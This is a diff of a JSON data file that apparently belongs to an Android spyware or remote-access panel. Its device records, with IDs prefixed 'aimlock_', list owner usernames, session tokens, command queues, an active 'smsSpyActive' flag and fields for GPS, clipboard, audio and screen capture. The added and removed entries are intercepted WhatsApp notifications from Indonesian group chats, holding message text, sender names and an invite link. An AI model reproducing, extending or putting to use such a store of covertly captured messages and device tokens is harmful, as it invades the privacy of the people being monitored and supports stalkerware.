@@ -22,6 +22,30 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1937 pesan dari 18 chat",
+        "time": "29/04 16:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777450980252
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (6 pesan): ~ .",
+        "content": "Turitial bg dika suarany kek gitu☺️😊🙂🙂",
+        "time": "29/04 16:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777450979957
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1938 pesan dari 18 chat",
+        "time": "29/04 16:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777450979933
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (5 pesan): ~ jirr yupii",
         "content": "gajelas jir sumpah",
         "time": "29/04 16:33",
@@ -3995,30 +4019,6 @@
         "time": "29/04 16:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1777450300356
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3389 pesan dari 19 chat",
-        "time": "29/04 16:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777450296502
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (482 pesan): ~ JB ALL GAME BY|| FASKER STORE!",
-        "content": "📊 270 Member bagusnya apa https://chat.whatsapp.com/LC8Yw6qdK512DzMGVfIBvA?mode=gi_t",
-        "time": "29/04 16:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777450296460
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB || ISIAN  LYEZ STORE X ALL OWN (63 pesan): ~ ---'",
-        "content": "Eneke",
-        "time": "29/04 16:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777450282984
       }
     ],
     "galleryPhotos": [],
@@ -17663,6 +17663,38 @@
       "model": "TECNO MOBILE LIMITED TECNO LE7",
       "androidVersion": "Android 11",
       "battery": 79,
+      "network": "Seluler: Indosat Ooredoo",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
+  },
+  {
+    "deviceId": "aimlock_08c4843d",
+    "deviceName": "TECNO LE7",
+    "ownerUsername": "Zal7Sex",
+    "token": "ec086158f264712088f909b50de18009",
+    "lastSeen": 1777450986915,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-29T08:23:06.915Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 78,
       "network": "Seluler: Indosat Ooredoo",
       "sim1": "Indosat Ooredoo",
       "sim2": "Tidak ada"
